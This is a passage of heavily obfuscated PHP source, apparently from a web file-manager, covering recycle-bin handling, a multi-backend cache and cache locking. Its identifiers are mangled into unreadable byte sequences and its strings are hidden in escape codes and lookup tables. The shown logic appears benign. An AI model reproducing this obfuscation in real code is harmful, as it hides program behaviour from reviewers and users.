$ãÀŠ‚İ¾[$ğÂäÚ·[2508]] = array($ğÂäÚ·[2509] => LNG($ğÂäÚ·[2508]), $ğÂäÚ·[2510] => intval($ğ”çÂÜ­[$ğÂäÚ·[950]]), $ğÂäÚ·[640] => intval($ğ”çÂÜ­[$ğÂäÚ·[79]])); $şşµì‘ = KodIO::fileTypeList(); foreach ($şşµì‘ as $Õò€óÏç => $×‚£‘Ò) { $µ–›ä³è[$ğÂäÚ·[501]] = $this->fileTypeWhere($Õò€óÏç); $ğ”çÂÜ­ = $this->field(array($ğÂäÚ·[949] => $ğÂäÚ·[950], $ğÂäÚ·[951] => $ğÂäÚ·[79]))->where($µ–›ä³è)->find(); $ãÀŠ‚İ¾[$Õò€óÏç] = array($ğÂäÚ·[2509] => $×‚£‘Ò[$ğÂäÚ·[32]], $ğÂäÚ·[2510] => intval($ğ”çÂÜ­[$ğÂäÚ·[950]]), $ğÂäÚ·[640] => intval($ğ”çÂÜ­[$ğÂäÚ·[79]])); } Cache::set($Î©¾ë·¸, $ãÀŠ‚İ¾, 1200); return $ãÀŠ‚İ¾; } public function fileNameExist($¸‚“¹ÉÒ, $‡êÑº¾Î) { $æ¢Ù›¤ =& $_SERVER[©—Ò»ÅĞ]; $¢ªâÄ£ = $this->field($æ¢Ù›¤[2511])->where(array($æ¢Ù›¤[190] => $¸‚“¹ÉÒ, $æ¢Ù›¤[32] => $‡êÑº¾Î, $æ¢Ù›¤[520] => 0))->find(); return is_array($¢ªâÄ£) ? $¢ªâÄ£[$æ¢Ù›¤[191]] : !1; } public function childList($ÌãÂ®ÃŠ) { $„®ÎÂÌ¬ =& $_SERVER[©—Ò»ÅĞ]; $¬ëİÊ»è = $„®ÎÂÌ¬[2483] . $ÌãÂ®ÃŠ; if (isset(self::$cacheChildList[$¬ëİÊ»è])) { return self::$cacheChildList[$¬ëİÊ»è]; } $ÒŒš»‡Ğ = array($„®ÎÂÌ¬[190] => intval($ÌãÂ®ÃŠ), $„®ÎÂÌ¬[520] => 0); $Á·„¦åÙ = $this->where($ÒŒš»‡Ğ)->select(); $Á·„¦åÙ = $Á·„¦åÙ ? $Á·„¦åÙ : array(); self::$cacheChildList[$¬ëİÊ»è] = $Á·„¦åÙ; foreach ($Á·„¦åÙ as $ƒøˆ—Û) { $¬ëİÊ»è = $„®ÎÂÌ¬[547] . $ƒøˆ—Û[$„®ÎÂÌ¬[191]]; self::$cacheSourceInfo[$¬ëİÊ»è] = $ƒøˆ—Û; } return $Á·„¦åÙ; } public function fileNameAuto($ËÅ›“¤, $®¬Œó›‡, $§ç²ò©û = REPEAT_RENAME, $¤Ö¢º—ü = false) { $ó‹ƒ÷İ¬ =& $_SERVER[©—Ò»ÅĞ]; $¹²ä“¤÷ = get_path_ext($®¬Œó›‡); $ôëôñûâ = $¹²ä“¤÷ ? get_path_ext_name($®¬Œó›‡) . $ó‹ƒ÷İ¬[2512] . $¹²ä“¤÷ : $®¬Œó›‡ . $ó‹ƒ÷İ¬[474]; $º¹Åšı‰ = array($ó‹ƒ÷İ¬[190] => $ËÅ›“¤, $ó‹ƒ÷İ¬[520] => 0, $ó‹ƒ÷İ¬[32] => array($ó‹ƒ÷İ¬[473], $ôëôñûâ)); $ê½ø‹ëÓ = $this->field($ó‹ƒ÷İ¬[32])->where($º¹Åšı‰)->select(); $Âã¡ù½‘ = array_to_keyvalue($ê½ø‹ëÓ, $ó‹ƒ÷İ¬[12], $ó‹ƒ÷İ¬[32]); return $this->fileNameAutoGet($Âã¡ù½‘, $®¬Œó›‡, $§ç²ò©û, $¤Ö¢º—ü); } public function fileNameAutoGet($òÂ¿š¦, $òÚŸÔ‚î, $¦ª¥Âàø, $ºĞÈ²°Œ) { $»©¼±Óè =& $_SERVER[©—Ò»ÅĞ]; if ($¦ª¥Âàø == REPEAT_REPLACE || !$òÂ¿š¦ || !in_array_not_case($òÚŸÔ‚î, $òÂ¿š¦) || $ºĞÈ²°Œ && $¦ª¥Âàø != REPEAT_RENAME_FOLDER) { return $òÚŸÔ‚î; } if ($¦ª¥Âàø == REPEAT_SKIP) { return !1; } $»¸å…°‚ = $»©¼±Óè[10] . get_path_ext($òÚŸÔ‚î); $»¸å…°‚ = $»¸å…°‚ == $»©¼±Óè[10] || $ºĞÈ²°Œ ? $»©¼±Óè[12] : $»¸å…°‚; for ($ñà›ÄÈê = 1; $ñà›ÄÈê <= count($òÂ¿š¦) + 1; $ñà›ÄÈê++) { $²Îñ’ä = substr($òÚŸÔ‚î, 0, strlen($òÚŸÔ‚î) - strlen($»¸å…°‚)); $ éíç¯¤ = $²Îñ’ä . "\50{$ñà›ÄÈê}\51{$»¸å…°‚}"; if (!in_array_not_case($ éíç¯¤, $òÂ¿š¦)) { return $ éíç¯¤; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\x75\x72\x63\145\137\x72\145\x63\x79\x63\x6c\x65"; protected $dataAuto = array(array("\x63\162\x65\x61\164\x65\124\x69\155\x65", "\164\x69\155\145", "\151\x6e\x73\145\162\x74", "\x66\165\x6e\143\x74\151\x6f\156")); public function listData($–Ï„óí = false) { $ÁÜòŞù˜ =& $_SERVER[©—Ò»ÅĞ]; $–Ï„óí = $–Ï„óí ? $–Ï„óí : USER_ID; $™ÆƒòšÉ = $this->where(array($ÁÜòŞù˜[1969] => $–Ï„óí))->select(); return array_to_keyvalue($™ÆƒòšÉ, $ÁÜòŞù˜[12], $ÁÜòŞù˜[191]); } public function moveToRecycle($ğå›¥ñ®) { $ÛçĞÎÖ =& $_SERVER[©—Ò»ÅĞ]; $›ë”ÅÓŞ = Model($ÛçĞÎÖ[1533]); $ƒªÎ¥® = $›ë”ÅÓŞ->sourceInfo($ğå›¥ñ®); if (!$ƒªÎ¥® || $ƒªÎ¥®[$ÛçĞÎÖ[520]] == $ÛçĞÎÖ[91]) { return; } $¦„ˆ“÷ = array($ÛçĞÎÖ[506] => $ğå›¥ñ®, $ÛçĞÎÖ[1969] => USER_ID, $ÛçĞÎÖ[670] => $ƒªÎ¥®[$ÛçĞÎÖ[188]], $ÛçĞÎÖ[671] => $ƒªÎ¥®[$ÛçĞÎÖ[589]], $ÛçĞÎÖ[674] => $ƒªÎ¥®[$ÛçĞÎÖ[604]]); $this->add($¦„ˆ“÷); $this->recycleMove($ğå›¥ñ®, 1); if ($ƒªÎ¥®[$ÛçĞÎÖ[500]] == $ÛçĞÎÖ[91]) { $ ¥·×“Ü = array($ÛçĞÎÖ[674] => array($ÛçĞÎÖ[635], $ƒªÎ¥®[$ÛçĞÎÖ[604]] . $ğå›¥ñ® . $ÛçĞÎÖ[636])); $›ë”ÅÓŞ->where($ ¥·×“Ü)->setField($ÛçĞÎÖ[520], 1); } } public function clear() { $this->remove(!1); } public function remove($”Œı›·… = false, $ìçĞÖÌ… = false) { $çãÁ„ÔÙ =& $_SERVER[©—Ò»ÅĞ]; $ìçĞÖÌ… = $ìçĞÖÌ… ? $ìçĞÖÌ… : USER_ID; $ñô»ìŠ€ = Model($çãÁ„ÔÙ[1533]); $ÏŸÀÔæ = $this->listData($ìçĞÖÌ…); $”Œı›·… = $”Œı›·… === !1 ? !1 : $”Œı›·…; $àÛõš×™ = array(); foreach ($ÏŸÀÔæ as $è§“²Ï¢) { if ($”Œı›·… != !1 && !in_array($è§“²Ï¢, $”Œı›·…)) { continue; } $î¸ùªù¬ = $ñô»ìŠ€->sourceInfo($è§“²Ï¢); $ñô»ìŠ€->remove($è§“²Ï¢, !1); $»Ã•î½¡ = $î¸ùªù¬[$çãÁ„ÔÙ[188]] . $çãÁ„ÔÙ[11] . $î¸ùªù¬[$çãÁ„ÔÙ[589]]; $àÛõš×™[$»Ã•î½¡] = array($çãÁ„ÔÙ[670] => $î¸ùªù¬[$çãÁ„ÔÙ[188]], $çãÁ„ÔÙ[589] => $î¸ùªù¬[$çãÁ„ÔÙ[589]]); $this->where(array($çãÁ„ÔÙ[191] => $è§“²Ï¢))->delete(); } foreach ($àÛõš×™ as $‰¬©öíê) { $ñô»ìŠ€->targetSpaceUpdate($‰¬©öíê[$çãÁ„ÔÙ[188]], $‰¬©öíê[$çãÁ„ÔÙ[589]]); } } public function restore($µÜºŠ¹ = false) { $Ù¼§õÜ = $this->listData(); $this->_restoreSource($Ù¼§õÜ, $µÜºŠ¹); } public function removeUserAll($÷«¸²İ) { $this->remove(!1, $÷«¸²İ); } public function restoreItem($åñƒœ÷) { $this->_restoreSource(array($åñƒœ÷), array($åñƒœ÷)); } private function _restoreSource($ğÙïôÕ€, $æ’Ä Â¬) { $Ã»¯©ù =& $_SERVER[©—Ò»ÅĞ]; $ŠŸ±ß¶Ñ = Model($Ã»¯©ù[1533]); $æ’Ä Â¬ = $æ’Ä Â¬ == !1 ? !1 : $æ’Ä Â¬; if (!$ğÙïôÕ€) { return !0; } $©®ªåë = array(); foreach ($ğÙïôÕ€ as $”ØÛ¨Ôş) { if ($æ’Ä Â¬ != !1 && !in_array($”ØÛ¨Ôş, $æ’Ä Â¬)) { continue; } $¼Ğšëº = $ŠŸ±ß¶Ñ->sourceInfo($”ØÛ¨Ôş); $ ³ÒË… = $ŠŸ±ß¶Ñ->sourceInfo($¼Ğšëº[$Ã»¯©ù[190]]); if ($ ³ÒË…[$Ã»¯©ù[520]] == $Ã»¯©ù[91]) { continue; } $ŠŸ±ß¶Ñ->lockMoveStart($”ØÛ¨Ôş); $this->recycleMove($”ØÛ¨Ôş, 0); if ($¼Ğšëº[$Ã»¯©ù[500]] == $Ã»¯©ù[91]) { $Îœ˜åâÏ = array($Ã»¯©ù[674] => array($Ã»¯©ù[635], $¼Ğšëº[$Ã»¯©ù[604]] . $”ØÛ¨Ôş . $Ã»¯©ù[636])); $ŠŸ±ß¶Ñ->where($Îœ˜åâÏ)->setField($Ã»¯©ù[520], 0); $this->restoreFolderChildren($”ØÛ¨Ôş, $ğÙïôÕ€); } $this->where(array($Ã»¯©ù[191] => $”ØÛ¨Ôş))->delete(); $ŠŸ±ß¶Ñ->folderSizeReset($¼Ğšëº[$Ã»¯©ù[190]]); $©®ªåë[] = $¼Ğšëº[$Ã»¯©ù[190]]; if ($¼Ğšëº[$Ã»¯©ù[500]] == $Ã»¯©ù[91]) { $©®ªåë[] = $”ØÛ¨Ôş; } $ŠŸ±ß¶Ñ->lockMoveEnd($”ØÛ¨Ôş); } $ŠŸ±ß¶Ñ->updateModifyTime($©®ªåë); } private function restoreFolderChildren($™íÓê›®, $úŒšˆµä) { $İÜµÇ¤é =& $_SERVER[©—Ò»ÅĞ]; $ÈÜ¨¬¹ = Model($İÜµÇ¤é[1533]); $³–ï×¤¨ = array($İÜµÇ¤é[191] => array($İÜµÇ¤é[7], array())); foreach ($úŒšˆµä as $Õöñµ‹) { if ($Õöñµ‹ == $™íÓê›®) { continue; } if (!$ÈÜ¨¬¹->isParentOf($™íÓê›®, $Õöñµ‹)) { continue; } $ÜÒØÊ¦ˆ = $ÈÜ¨¬¹->sourceInfo($Õöñµ‹); if ($ÜÒØÊ¦ˆ[$İÜµÇ¤é[500]] == $İÜµÇ¤é[91]) { $³–ï×¤¨[] = array($İÜµÇ¤é[674] => array($İÜµÇ¤é[635], $ÜÒØÊ¦ˆ[$İÜµÇ¤é[604]] . $Õöñµ‹ . $İÜµÇ¤é[636])); } else { $³–ï×¤¨[$İÜµÇ¤é[191]][1][] = $Õöñµ‹; } } if (!$³–ï×¤¨[$İÜµÇ¤é[191]][1]) { unset($³–ï×¤¨[$İÜµÇ¤é[191]]); } if (!$³–ï×¤¨) { return; } if (is_array($³–ï×¤¨[$İÜµÇ¤é[191]]) && is_array($³–ï×¤¨[$İÜµÇ¤é[191]][1])) { $³–ï×¤¨[$İÜµÇ¤é[191]][1] = array_unique($³–ï×¤¨[$İÜµÇ¤é[191]][1]); } $³–ï×¤¨[$İÜµÇ¤é[1168]] = $İÜµÇ¤é[2285]; $ÈÜ¨¬¹->where($³–ï×¤¨)->setField($İÜµÇ¤é[520], 1); } private function recycleMove($™şÚï·É, $àªßïÌ = 1) { $èù©„© =& $_SERVER[©—Ò»ÅĞ]; $Õë¡í”© = Model($èù©„©[1533]); $ì¿”ªœÇ = Model($èù©„©[2513]); $èú¯€İò = array($èù©„©[191] => $™şÚï·É); if ($àªßïÌ) { $Õë¡í”©->where($èú¯€İò)->setField($èù©„©[520], 1); $ì¿”ªœÇ->eventRecycle($™şÚï·É, $èù©„©[2514]); } else { $ŠÔÅ„ÁÀ = $Õë¡í”©->where($èú¯€İò)->find(); $äáçš”Õ = $ŠÔÅ„ÁÀ[$èù©„©[500]] == $èù©„©[91]; $»Ññ¿º = $Õë¡í”©->fileNameAuto($ŠÔÅ„ÁÀ[$èù©„©[190]], $ŠÔÅ„ÁÀ[$èù©„©[32]], REPEAT_RENAME_FOLDER, $äáçš”Õ); if ($»Ññ¿º != $ŠÔÅ„ÁÀ[$èù©„©[32]]) { $Õë¡í”©->rename($™şÚï·É, $»Ññ¿º); } $Õë¡í”©->where($èú¯€İò)->setField($èù©„©[520], 0); $ì¿”ªœÇ->eventRecycle($™şÚï·É, $èù©„©[968]); } } } goto bŸ„èÈÃå; fêĞôÔÃ·‘: class Cache { protected static $handle; protected static $memoryCache; protected static $runTimeCache; public static function init() { $ÔúÈÍÇ =& $_SERVER[©—Ò»ÅĞ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); self::$runTimeCache = array(); $•‚¬¤¹ = $GLOBALS[$ÔúÈÍÇ[6]][$ÔúÈÍÇ[424]]; $Ì«Èò¥å = $•‚¬¤¹[$•‚¬¤¹[$ÔúÈÍÇ[980]]]; $²”ïÀ¼Ò = $•‚¬¤¹[$ÔúÈÍÇ[981]]; switch ($•‚¬¤¹[$ÔúÈÍÇ[980]]) { case $ÔúÈÍÇ[21]: self::$handle = Model($ÔúÈÍÇ[982]); break; case $ÔúÈÍÇ[983]: self::$handle = new CacheRedis($Ì«Èò¥å, $²”ïÀ¼Ò); break; case $ÔúÈÍÇ[984]: self::$handle = new CacheMemcached($Ì«Èò¥å, $²”ïÀ¼Ò); break; case $ÔúÈÍÇ[230]: self::$handle = new CacheFile($Ì«Èò¥å, $²”ïÀ¼Ò); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ú»ØŠß©) { if (is_array($ú»ØŠß©) || is_object($ú»ØŠß©)) { $ú»ØŠß© = json_encode($ú»ØŠß©); } $ú»ØŠß© = rawurlencode($ú»ØŠß©); return md5(KOD_SITE_ID . $_SERVER[©—Ò»ÅĞ][11] . $ú»ØŠß©); } public static function get($ÉÀµÙ›…, $ŞíôìÀÊ = false) { $‘·ÎìÅ = self::key($ÉÀµÙ›…); $„ƒ™§€¾ = self::init(); if ($ŞíôìÀÊ) { return unserialize($„ƒ™§€¾->get($‘·ÎìÅ)); } if (!isset(self::$memoryCache[$‘·ÎìÅ])) { $À¾Õø»ª = $„ƒ™§€¾->get($‘·ÎìÅ); self::$memoryCache[$‘·ÎìÅ] = unserialize($À¾Õø»ª); } return self::$memoryCache[$‘·ÎìÅ]; } public static function set($Äµ‡æô, $²ÜÒ½ß», $áÌ´Ç¶ú = false) { $Ÿ°ä¼ïÚ =& $_SERVER[©—Ò»ÅĞ]; $š¥ÉŒ‚ = self::key($Äµ‡æô); if (isset(self::$memoryCache[$š¥ÉŒ‚]) && self::$memoryCache[$š¥ÉŒ‚] === $²ÜÒ½ß») { return !0; } if ($áÌ´Ç¶ú === 0) { self::$memoryCache[$š¥ÉŒ‚] = $²ÜÒ½ß»; return !0; } $–ÊóİÌ” = self::init(); $ØÄˆÃÃŸ = serialize($²ÜÒ½ß»); CacheLock::lock($Äµ‡æô . $Ÿ°ä¼ïÚ[985]); $‚î×¼Üù = $–ÊóİÌ”->set($š¥ÉŒ‚, $ØÄˆÃÃŸ, $áÌ´Ç¶ú); self::$memoryCache[$š¥ÉŒ‚] = $²ÜÒ½ß»; CacheLock::unlock($Äµ‡æô . $Ÿ°ä¼ïÚ[985]); return $‚î×¼Üù; } public static function getCall($³¼ÈÕûœ, $Äòõ®º, $›±¥…åŠ, $ ²áÌ®½ = array()) { $Ç˜›÷ =& $_SERVER[©—Ò»ÅĞ]; $ï““ıìº = self::get($³¼ÈÕûœ); if ($ï““ıìº || $ï““ıìº === $Ç˜›÷[12]) { return $ï““ıìº; } $ï““ıìº = call_user_func_array($›±¥…åŠ, $ ²áÌ®½); $ï““ıìº = $ï““ıìº ? $ï““ıìº : $Ç˜›÷[12]; self::set($³¼ÈÕûœ, $ï““ıìº, $Äòõ®º); return $ï““ıìº; } public static function limitCall($¹ŠÚñäü, $ıÎçº° = 15, $›¿Éã˜ = 30, $ë›¸°Äş = true) { $—Œ½’©ä =& $_SERVER[©—Ò»ÅĞ]; static $»Ç÷È· = array(); if ($ë›¸°Äş) { $¹ŠÚñäü = $¹ŠÚñäü . $—Œ½’©ä[986] . KodUser::id() . $—Œ½’©ä[987] . get_client_ip(); } if (isset($»Ç÷È·[$¹ŠÚñäü]) && is_array($»Ç÷È·[$¹ŠÚñäü])) { return $»Ç÷È·[$¹ŠÚñäü][$—Œ½’©ä[332]] <= $›¿Éã˜; } $‹·ğò¯£ = self::get($¹ŠÚñäü); if (!is_array($‹·ğò¯£) || time() - $‹·ğò¯£[$—Œ½’©ä[204]] > $ıÎçº°) { $‹·ğò¯£ = array($—Œ½’©ä[204] => time(), $—Œ½’©ä[332] => 0); } $‹·ğò¯£[$—Œ½’©ä[332]]++; self::set($¹ŠÚñäü, $‹·ğò¯£, $ıÎçº°); $»Ç÷È·[$¹ŠÚñäü] = $‹·ğò¯£; return $‹·ğò¯£[$—Œ½’©ä[332]] <= $›¿Éã˜; } public static function limitRuntime($òã…£ìè, $ìéãË«) { $»éßÓÓš = $_SERVER[©—Ò»ÅĞ][988] . $òã…£ìè; if (isset(self::$runTimeCache[$»éßÓÓš]) || !$ìéãË«) { return !0; } $Â™ÍØïÄ = intval(self::get($»éßÓÓš)); $Â™ÍØïÄ = !$Â™ÍØïÄ || $Â™ÍØïÄ <= 0 ? 1 : $Â™ÍØïÄ + 1; if ($Â™ÍØïÄ > $ìéãË«) { return !1; } self::$runTimeCache[$»éßÓÓš] = !0; self::set($»éßÓÓš, $Â™ÍØïÄ, 3600); return !0; } public static function limitRuntimeClear() { if (!self::$runTimeCache) { return; } foreach (self::$runTimeCache as $¥ÓşÇ¸Ş => $ïÍÇÎä¼) { $’ãÎ‘µü = intval(self::get($¥ÓşÇ¸Ş)); $’ãÎ‘µü = !$’ãÎ‘µü || $’ãÎ‘µü <= 1 ? 0 : $’ãÎ‘µü - 1; self::set($¥ÓşÇ¸Ş, $’ãÎ‘µü, 3600); } self::$runTimeCache = array(); } public static function remove($ã…øƒ’ß) { $ñúËåõ = self::key($ã…øƒ’ß); unset(self::$memoryCache[$ñúËåõ]); self::clearTimeout(); CacheLock::lock($ã…øƒ’ß); $êéŒèÕÂ = self::init()->remove($ñúËåõ); CacheLock::unlock($ã…øƒ’ß); return $êéŒèÕÂ; } public static function removeMemory($ëÄÀ¤Æ) { $œü•¡éÆ = self::key($ëÄÀ¤Æ); unset(self::$memoryCache[$œü•¡éÆ]); } public static function clearMemory($¦Â¥‡œ = false) { if ($¦Â¥‡œ) { $¦Â¥‡œ = self::key($¦Â¥‡œ); unset(self::$memoryCache[$¦Â¥‡œ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[©—Ò»ÅĞ][989])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[©—Ò»ÅĞ][990])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($äîîí—°, $½‚Ûùù) { $ÔÃ˜ë·± =& $_SERVER[©—Ò»ÅĞ]; $this->cachePath = $äîîí—°[$ÔÃ˜ë·±[87]]; $this->prefix = $ÔÃ˜ë·±[991]; $this->cacheTime = $½‚Ûùù; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ôé°ì·­) { $ËÔÒ±Üƒ =& $_SERVER[©—Ò»ÅĞ]; $ôé°ì·­ = str_replace(array($ËÔÒ±Üƒ[992], $ËÔÒ±Üƒ[97], $ËÔÒ±Üƒ[76]), $ËÔÒ±Üƒ[993], $ôé°ì·­); return $this->cachePath . $ËÔÒ±Üƒ[994] . $ôé°ì·­ . $ËÔÒ±Üƒ[995]; } public function set($–Ë‘àâ›, $çÂøÉ§©, $´¿¤ê‰ø = false) { $´¿¤ê‰ø = $´¿¤ê‰ø ? $´¿¤ê‰ø : $this->cacheTime; $øàÏ·õ = $this->getFile($–Ë‘àâ›); if (file_put_contents($øàÏ·õ, $this->prefix . $çÂøÉ§©, LOCK_EX)) { @touch($øàÏ·õ, intval(time() + $´¿¤ê‰ø)); clearstatcache(); return !0; } @unlink($øàÏ·õ); return !1; } public function get($†Ì¿ÏĞê) { $ÁôÙ«Ş = $this->getFile($†Ì¿ÏĞê); if (file_exists($ÁôÙ«Ş) && filemtime($ÁôÙ«Ş) < time()) { @unlink($ÁôÙ«Ş); return !1; } $Ìş­ÉÉ¢ = @file_get_contents($ÁôÙ«Ş); return substr($Ìş­ÉÉ¢, strlen($this->prefix)); } public function remove($…ÉŠ™¨„) { $ßëšãşÔ = $this->getFile($…ÉŠ™¨„); return @unlink($ßëšãşÔ); } public function deleteAll() { $‘áı´€ =& $_SERVER[©—Ò»ÅĞ]; $İĞü½Å = scandir($this->cachePath); foreach ($İĞü½Å as $…Ö–…º¡) { $åá¯‰ıï = $this->cachePath . $…Ö–…º¡; if (strpos($åá¯‰ıï, $‘áı´€[995]) && strpos($åá¯‰ıï, $‘áı´€[996])) { @unlink($åá¯‰ıï); } } } public function clearTimeout() { $Ä­úµıâ =& $_SERVER[©—Ò»ÅĞ]; $üà©«Ûú = scandir($this->cachePath); foreach ($üà©«Ûú as $ããß”¿Ç) { $‘ıìØŸë = $this->cachePath . $ããß”¿Ç; if (strpos($‘ıìØŸë, $Ä­úµıâ[995]) && strpos($‘ıìØŸë, $Ä­úµıâ[996]) && filemtime($‘ıìØŸë) < time()) { @unlink($‘ıìØŸë); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $´ÀóÒÚ =& $_SERVER[©—Ò»ÅĞ]; if (self::$handle) { return self::$handle; } $ô—éó« = $GLOBALS[$´ÀóÒÚ[6]][$´ÀóÒÚ[424]]; self::$timeout = $ô—éó«[$´ÀóÒÚ[997]] ? $ô—éó«[$´ÀóÒÚ[997]] : 10; $Ûµ§¬µ = _get($GLOBALS[$´ÀóÒÚ[6]], $´ÀóÒÚ[998]); $ùœ’¢Èß = $ô—éó«[$´ÀóÒÚ[980]] ? $ô—éó«[$´ÀóÒÚ[980]] : $´ÀóÒÚ[230]; if ($ùœ’¢Èß == $´ÀóÒÚ[21] && $Ûµ§¬µ == $´ÀóÒÚ[13]) { $ùœ’¢Èß = $´ÀóÒÚ[230]; } switch ($ùœ’¢Èß) { case $´ÀóÒÚ[983]: self::$handle = new CacheLockRedis(); break; case $´ÀóÒÚ[984]: self::$handle = new CacheLockMemcached(); break; case $´ÀóÒÚ[21]: self::$handle = new CacheLockDatabase(); break; case $´ÀóÒÚ[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($´ÀóÒÚ[999], $´ÀóÒÚ[1000]); } return self::$handle; } private static function key($àâå¢‚Ì) { return $_SERVER[©—Ò»ÅĞ][1001] . Cache::key($àâå¢‚Ì); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¡‰êƒ¿Í = '') { self::$errorMsg = $¡‰êƒ¿Í; } public static function lockGlobal($óÙ’ÄØ“, $†¿«ˆÎÍ) { return self::lock($óÙ’ÄØ“, $†¿«ˆÎÍ, !0); } public static function lock($¹ƒúœ£ğ, $«”¼„Ş’ = false, $÷™£¯Œ€ = false) { $¼ÀÌó =& $_SERVER[©—Ò»ÅĞ]; $îŒ«ô© = self::init(); $ãû£Ú¹˜ = self::key($¹ƒúœ£ğ); $«”¼„Ş’ = $«”¼„Ş’ ? $«”¼„Ş’ : self::$timeout; $éÃÈ¹üø = timeFloat(); if (_get($GLOBALS, $¼ÀÌó[1002], !1)) { if (!$îŒ«ô©->lock($ãû£Ú¹˜, 0.2)) { die; } return !0; } $Çû«áß = $îŒ«ô©->lock($ãû£Ú¹˜, $«”¼„Ş’); $àßÀÆçä = timeFloat(); if (!$Çû«áß) { $º¾”Ä¡† = "\x6c\x6f\143\153\x20\x65\162\x72\x6f\x72\73\x6b\145\171\x3d{$¹ƒúœ£ğ}\73\164\151\155\x65\75{$«”¼„Ş’}\73" . self::$errorMsg . $¼ÀÌó[74] . get_caller_msg(); $õÉĞ£á = LNG($¼ÀÌó[1003]) . "\50{$«”¼„Ş’}\x73\x29\x2e" . LNG($¼ÀÌó[1004]); $õÉĞ£á .= $¼ÀÌó[1005]; if (is_string(self::$errorMsg) && self::$errorMsg) { $õÉĞ£á = $õÉĞ£á . $¼ÀÌó[1006] . self::$errorMsg; } write_log($¼ÀÌó[1007] . sprintf($¼ÀÌó[1008], timeFloat() - $éÃÈ¹üø) . $¼ÀÌó[1009] . $º¾”Ä¡† . $¼ÀÌó[1010] . json_encode(error_get_last()), $¼ÀÌó[1000]); show_json($õÉĞ£á, !1); } if (!$÷™£¯Œ€) { self::$lockItem[$ãû£Ú¹˜] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ƒĞïÍ = number_format(timeFloat() - $àßÀÆçä, 3); write_log($¼ÀÌó[1011] . $¹ƒúœ£ğ . $¼ÀÌó[1012] . $ƒĞïÍ, $¼ÀÌó[1000]); } return $Çû«áß; } public static function lockGet($à€Äà†¹) { $è‰ßÜ±° = self::key($à€Äà†¹); if (self::$lockItem[$è‰ßÜ±°]) { return self::$lockItem[$è‰ßÜ±°]; } return self::init()->lockGet($è‰ßÜ±°); } public static function unlock($–Óà£åÓ) { $†ğìùí =& $_SERVER[©—Ò»ÅĞ]; $¶äçÌ = self::key($–Óà£åÓ); self::$lockItem[$¶äçÌ] = null; self::init()->unlock($¶äçÌ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($†ğìùí[1013] . $–Óà£åÓ, $†ğìùí[1000]); } return; } public static function unlockRuntime() { $íÌĞÈÁŠ =& $_SERVER[©—Ò»ÅĞ]; $Ú‰§¡ü« = self::init(); $»í×ş’ = !1; foreach (self::$lockItem as $ØÊƒÅ¤« => $™°áíô’) { if (!$™°áíô’) { continue; } $Ú‰§¡ü«->unlock($ØÊƒÅ¤«); if (!$»í×ş’) { $»í×ş’ = !0; write_log($íÌĞÈÁŠ[1014] . $ØÊƒÅ¤« . $íÌĞÈÁŠ[74] . get_caller_msg(), $íÌĞÈÁŠ[1000]); continue; } write_log($íÌĞÈÁŠ[1014] . $ØÊƒÅ¤«, $íÌĞÈÁŠ[1000]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $¸¦Ûé˜­ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($íÌĞÈÁŠ[1015] . $¸¦Ûé˜­ . $íÌĞÈÁŠ[1016] . ACTION, $íÌĞÈÁŠ[1000]); } } public static function fileLock($ñª˜Åà˜) { $Ö×Ğò¸õ =& $_SERVER[©—Ò»ÅĞ]; if (!$GLOBALS[$Ö×Ğò¸õ[1017]]) { $GLOBALS[$Ö×Ğò¸õ[1017]] = array(); } $GLOBALS[$Ö×Ğò¸õ[1017]][$ñª˜Åà˜] = !1; $ÄÀÒ¥àˆ = fopen(DATA_PATH . $ñª˜Åà˜ . $Ö×Ğò¸õ[1018], $Ö×Ğò¸õ[1019]); if (!$ÄÀÒ¥àˆ) { return !1; } $GLOBALS[$Ö×Ğò¸õ[1017]][$ñª˜Åà˜] = $ÄÀÒ¥àˆ; if (flock($ÄÀÒ¥àˆ, LOCK_EX)) { return !0; } self::unlock($ñª˜Åà˜); show_json($Ö×Ğò¸õ[1020], !1); return !1; } public static function fileUnlock($ê©˜»‚) { $–¾˜‡² =& $_SERVER[©—Ò»ÅĞ]; $¾µ‘½† = $GLOBALS[$–¾˜‡²[1017]][$ê©˜»‚]; if (!$¾µ‘½†) { return; } $GLOBALS[$–¾˜‡²[1017]][$ê©˜»‚] = !1; flock($¾µ‘½†, LOCK_UN); fclose($¾µ‘½†); } public static function fileUnlockAll() { $Ÿè•õ“ =& $_SERVER[©—Ò»ÅĞ]; if (!isset($GLOBALS[$Ÿè•õ“[1017]]) || !$GLOBALS[$Ÿè•õ“[1017]]) { return; } foreach ($GLOBALS[$Ÿè•õ“[1017]] as $È˜æøŠ‹ => $¨˜Å†²Â) { if (!$¨˜Å†²Â) { continue; } $GLOBALS[$Ÿè•õ“[1017]][$È˜æøŠ‹] = !1; flock($¨˜Å†²Â, LOCK_UN); fclose($¨˜Å†²Â); } $GLOBALS[$Ÿè•õ“[1017]] = array(); } } goto BöŠ§«Ô»†; dïÆÃ½»Ç“: class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x66\x69\154\x65"; protected $tableMeta = array("\x74\x61\142\154\x65\116\x61\x6d\x65" => "\x69\157\137\146\x69\154\145\x5f\155\x65\x74\x61", "\155\x65\164\141\106\151\x65\x6c\144" => "\146\x69\154\x65\111\x44"); public function fileInfo($Ü•õ˜íÆ) { $÷¤û¨š‡ =& $_SERVER[©—Ò»ÅĞ]; static $›†ÌıêÁ = array(); if (!isset($›†ÌıêÁ[$Ü•õ˜íÆ])) { $¤ë­ÖŒå = $÷¤û¨š‡[2234]; 